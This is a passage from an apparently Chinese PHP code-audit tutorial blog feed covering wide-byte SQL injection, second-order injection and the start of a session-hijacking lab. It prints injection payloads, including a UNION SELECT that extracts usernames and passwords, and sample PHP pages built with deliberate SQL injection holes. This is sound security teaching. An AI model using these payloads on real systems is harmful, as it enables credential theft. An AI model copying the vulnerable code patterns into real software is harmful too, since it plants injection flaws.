punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span><span class="token string">'&lt;hr>'</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 执行SQL语句</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string">"SET NAMES 'GBK'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 循环输出返回值</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"ID: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'ID'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"username: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"password: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 关闭连接</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>插入特殊字符：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125143024280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h4><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125143216518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这次我们换成字符型参数，可以看到我们的单引号被转义了：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125143627883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="宽字节注入绕过"><a href="#宽字节注入绕过" class="headerlink" title="宽字节注入绕过"></a>宽字节注入绕过</h4><p>这里的前提也是数据库采用GBK的编码形式，我们在参数后面加一个%bf让它跟%5c拼接成两个字符，Mysql就会认为这是一个中文，所以就成功绕过函数的保护了。</p><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>20and<span class="token operator">%</span><span class="token number">201</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">--</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125145204984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>成功注入：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token number">1</span><span class="token operator">%</span>df<span class="token operator">%</span>27union<span class="token operator">%</span>20select<span class="token operator">%</span>20username<span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span>20from<span class="token operator">%</span>20user<span class="token operator">--</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125145353762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><ul><li>使用mysql_set_charset(GBK)字符集</li><li>使用mysql_real_escape_string进行转义</li></ul><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="二阶注入与一阶注入的区别"><a href="#二阶注入与一阶注入的区别" class="headerlink" title="二阶注入与一阶注入的区别"></a>二阶注入与一阶注入的区别</h4><p><strong>一阶注入：</strong></p><ol><li>一阶注入发生在一个HTTP请求和响应中，对系统的攻击是立即执行的。</li><li>攻击者在HTTP请求提交非法参数。</li><li>应用程序处理非法参数，将非法参数拼接到SQL语句中。</li><li>在攻击过程中向攻击者返回结果</li></ol><p><strong>二阶注入：</strong></p><ol><li>攻击者在HTTP请求中提交非法参数。</li><li>非法参数保存在数据库中。</li><li>攻击者提交第二次HTTP请求。</li><li>为处理第二次HTTP请求，程序检索储存在数据库中的非法参数，拼接到SQL语句中。</li><li>如果攻击成功，在第二次请求中返回结果</li></ol><h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p>因为是二阶注入，所以我们需要两个页面，我这里写了一个注册页面一个搜索页面。</p><p>register.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 判断数据是否为空</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># var_dump($_POST);</span>    <span class="token shell-comment comment"># 接收数据赋值给变量</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$usernae</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 连接数据库</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"数据库连接失败！"</span><span class="token punctuation">.</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 拼接SQL语句</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO user(id,username,password) VALUES('$id','$usernae','$password')"</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 接受结果集</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'&lt;script>alert("语句执行失败！")&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 判断结果集</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;script>alert("注册成功！")&lt;/script>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;script>alert("注册失败！")&lt;/script>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'&lt;script>alert("数据不能为空！")&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--表单--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>用户注册<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>register.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token constant">ID</span>：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    账号：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    密码：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>register<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>注册<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>search.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 判断是否为空</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'&lt;script>alert("数据不能为空！")&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># 赋值</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 连接数据库</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"数据库连接失败！"</span><span class="token punctuation">.</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 拼接SQL语句</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM USER WHERE id=$id"</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 接收结果集</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'&lt;script>alert("语句执行失败！")&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 遍历赋值</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM USER WHERE username='$username'"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'&lt;script>alert("语句执行失败！")&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token shell-comment comment"># var_dump($row);</span>            <span class="token keyword">echo</span> <span class="token string">"ID: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'ID'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"账号: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"密码: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--表单--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>search.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    搜索<span class="token constant">ID</span>：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>搜索<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="进行注入"><a href="#进行注入" class="headerlink" title="进行注入"></a>进行注入</h4><p>我们在第一次提交注册数据的时候，他对我们的数据进行了转义，但是数据存放的时候，它又会转回来，所以造成了一个二阶注入，我们先来注册一个SQL语句试一下：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125172224753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>可以看到单引号被转义了，我们再去数据库查一下，它又转回来了：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125172306564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>由此我们直接插一个注入语句进去，看看search页面能不能回显我们想要的数据：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125172512321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>因为在search中又进行了一次赋值，所以这时候我们如果查询数据，前面提交的恶意SQL语句就会被执行：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020112517392122.png#pic_center" alt="在这里插入图片描述"></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125174125147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>虽然我们一开始的注册页面没法直接注入，但是我们可以插一些特殊语句进去，再去看一下哪里使用了这个数据源，被使用的数据源<strong>未经过过滤重新赋值给了一个新的变量，我们再去调用这个变量</strong>从而造成了一个二阶注入。</p><h4 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h4><ul><li>在执行INSERT前判断转义后的字符是否存在“'”，如果存在就不执行INSERT</li><li>重新赋值变量进行查询时，做好过滤</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 宽字节注入 </tag>
            
            <tag> 二次注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：会话认证漏洞</title>
      <link href="/posts/8cae4f4a.html"/>
      <url>/posts/8cae4f4a.html</url>
      
        <content type="html"><![CDATA[<h3 id="会话认证漏洞"><a href="#会话认证漏洞" class="headerlink" title="会话认证漏洞"></a>会话认证漏洞</h3><ul><li>session固定攻击</li><li>session劫持攻击</li></ul><h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><blockquote><p>遇到比较多的就是在<code>cookie验证</code>上，通常是没有使用session来认证，直接将用户信息保存在cookie中。</p></blockquote><h3 id="session劫持攻击"><a href="#session劫持攻击" class="headerlink" title="session劫持攻击"></a>session劫持攻击</h3><blockquote><p>session劫持攻击是指黑客劫持目标用户的<code>session id</code>，来获取网站上未经许可的储存信息，特别是窃取目标用户的的cookie数据等，来取得网站的认可。</p></blockquote><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ol><li>目标用户需要先登录站点；</li><li>登录成功后，该用户会得到站点提供的一个会话标识SessionID；</li><li><strong>攻击者通过某种攻击手段捕获Session ID；</strong></li><li>攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/31d73b17e772ce03d00c3190e0873999.png#pic_center" alt="在这里插入图片描述"></p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>我搭建一个简陋的“网上钱包”系统，模拟黑客的攻击流程。</p><p>login.php:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM user WHERE username='$username' AND password='$password'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"执行失败！"</span><span class="token punctuation">.</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'book'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span>"location<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:8001/session_attack/member.php?user=".$username);</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"登录失败！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span 